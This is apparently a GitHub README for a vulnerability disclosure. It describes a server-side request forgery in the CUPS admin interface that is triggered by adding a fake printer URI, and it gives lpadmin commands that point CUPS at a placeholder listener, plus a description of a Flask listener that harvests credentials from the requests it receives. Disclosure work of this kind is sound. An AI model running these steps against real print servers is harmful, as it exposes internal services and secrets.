<img width="1918" height="321" alt="image" src="https://github.com/user-attachments/assets/5eeea057-13d9-4502-8327-dfa64af3f8f0" />
<img width="2698" height="422" alt="image" src="https://github.com/user-attachments/assets/159525ba-b207-4db5-bf36-33c79c2adb71" />
<img width="1712" height="236" alt="image" src="https://github.com/user-attachments/assets/08af1e9a-d40b-45fa-85ce-3974f306678b" />

# https://support.apple.com/en-en/125110


## SSRF via Fake Printer Injection in CUPS
**OE19992541396** — Reported: 2024-09-08  
**Finder / Reporter:** SelfHack AI / Alperen T. Ugurlu

> **WARNING:** This PoC is intended for authorized, isolated lab environments only. Do **NOT** run this against production systems or systems you do not own or have explicit permission to test. Unauthorized testing may be illegal.

---

## How SelfHack AI Discovered This 

SelfHack AI read the history books — the PrintNightmare saga (CVE‑2021‑1675 / CVE‑2021‑34527) — and used that story as a lesson, not a recipe. It simulated those failure modes inside a safe lab, asking a simple, dangerous question: what would a spooler do if told to talk to the wrong place? The agent then crawled into the CUPS admin UI, mapped the Add‑Printer workflow, and liked the spooler executable as a promising character in the plot. With needle‑precise tests and quiet runtime tracing, it fed crafted inputs and watched the spooler binary open a socket and walk straight to an attacker‑controlled listener — headers and timing in hand, the scene was undeniable. That single, observable handoff (admin UI → spooler process → outbound HTTP) turned a theory into a confirmed SSRF finding. This was not luck: it was autonomous learning — public research taught the agent what to suspect, simulations taught it how to test, and controlled observation let it prove the crime on a macOS stage.


## TL;DR
CUPS (Common UNIX Printing System) admin web interface (`http://localhost:631/admin`) can be induced to initiate HTTP requests when a malicious or fake printer connection URI (e.g., `http://attacker:8080`) is added via the **Add Printer** flow. This allows SSRF and potential disclosure of sensitive data or access to internal services.

---

## Impact
- SSRF: server-side requests to attacker-controlled or internal endpoints.  
- Possible exposure of sensitive headers/body content.  
- Potential access to cloud metadata endpoints (e.g., `169.254.169.254`) or other internal services.  
- Enables further exploitation or lateral movement when combined with other vulnerabilities.

---

## Affected Components / Environment
- CUPS admin web interface (`/admin`) — admin privileges required to add printers.  
- Observed on macOS and Linux systems with CUPS accepting arbitrary HTTP URIs without sufficient validation.  
- PoC testing requires: CUPS host + attacker-controlled HTTP listener (Flask PoC included in this repo).

---

## Root Cause
CUPS does not adequately validate or restrict admin-supplied printer connection URIs. When a connection URI is accepted, the CUPS daemon attempts to contact that URI — enabling SSRF when the URI points to internal or attacker-controlled addresses.

---

## Reproduction (authorized lab only)

### 1) Using the CUPS Admin UI
1. Open the CUPS admin UI: `http://localhost:631/admin` (admin privileges required).  
2. Go to **Add Printer**.  
3. In the **Connection** field enter:  
http://<POC_SERVER_IP>:8080

bash
Kodu kopyala
4. Complete the printer addition process.  
5. The PoC listener (see below) should receive and log the request from the CUPS server.

### 2) Start the PoC listener
```bash
cd ssrf-cups-fake-printer
chmod +x poc.py
./poc.py // starts the Flask listener on port 8080.
```
The listener logs incoming requests and scans headers/body for basic sensitive patterns.

### 3) Example using lpadmin (Linux/macOS)
```bash
sudo lpadmin -p fake-printer -E -v "http://<POC_SERVER_IP>:8080" -m everywhere
sudo cupsenable fake-printer
sudo lpstat -p fake-printer -l
```
These commands programmatically add a printer that points at the PoC listener, causing CUPS to attempt the connection.

# PoC Listener
See poc.py — a minimal Flask-based HTTP listener included in this repository. It:

Logs request metadata (client IP, headers, body).
Searches request content and headers for simple sensitive-data patterns (email, basic "password" patterns, credit-card-like numbers, API key heuristics).
Returns a JSON summary of what it observed.

Note: The PoC is intentionally simple for demonstration and triage. Do not treat it as production monitoring code.

# Disclosure Timeline
```bash
2024-09-08 — Vulnerability reported (OE19992541396)
2024-09-30 — Reporter follow-up
2024-10-02 — PoC provided to vendor
2025-09-15 - Fix Date
```
